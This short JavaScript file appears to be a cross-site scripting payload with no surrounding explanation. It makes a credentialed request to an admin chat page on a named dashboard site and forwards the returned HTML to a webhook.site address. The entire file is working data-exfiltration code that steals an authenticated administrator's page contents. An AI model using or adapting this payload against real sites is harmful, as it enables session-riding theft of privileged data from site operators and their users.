var xhr = new XMLHttpRequest();

xhr.open('GET', 'https://haatadmindashboard.azurewebsites.net/admin/chat', true);

xhr.withCredentials = true;
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4) {

        var http = new XMLHttpRequest();
        var url = "https://webhook.site/f86252e0-552c-4df5-8ce0-8086d964800e";
        http.open("POST", url, true);
        http.setRequestHeader("Content-type", "text/plain");
        http.onreadystatechange = function() {
            if (http.readyState == 4 && http.status == 200) {

            }
        };
        
           page_data = {
                    "page_html": xhr.responseText,
                    "uri": 'https://haatadmindashboard.azurewebsites.net/admin/get_admins'
                };
        http.send(JSON.stringify(page_data));



  }
};
xhr.send(null);
